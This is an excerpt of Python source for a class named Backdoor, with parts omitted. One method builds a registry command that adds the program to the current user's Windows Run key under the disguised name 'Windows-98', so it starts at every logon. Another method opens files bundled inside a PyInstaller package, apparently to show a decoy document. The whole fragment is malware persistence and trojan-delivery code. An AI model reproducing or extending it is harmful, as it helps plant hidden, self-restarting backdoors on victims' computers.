...
class Backdoor:
    ...
    def persist(self):
        pathToPersist = os.environ['INFOPATH']
        #print(pathToPersist)
        cmd = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows-98 /t REG_SZ /d "' + pathToPersist + '"'
    ...
    def makeFile(self,file):
        if hasattr(sys,"_MEIPASS"):
            if file not in sys._MEIPASS:
                front = sys._MEIPASS + f"/tmp/{file}"
                #print(f'Opening PLEASE: {file}')
                subprocess.Popen(f'open {front}',shell=True)
        else:
            #print(f'Opening: {file}')
            subprocess.Popen(f'open {file}',shell=True)
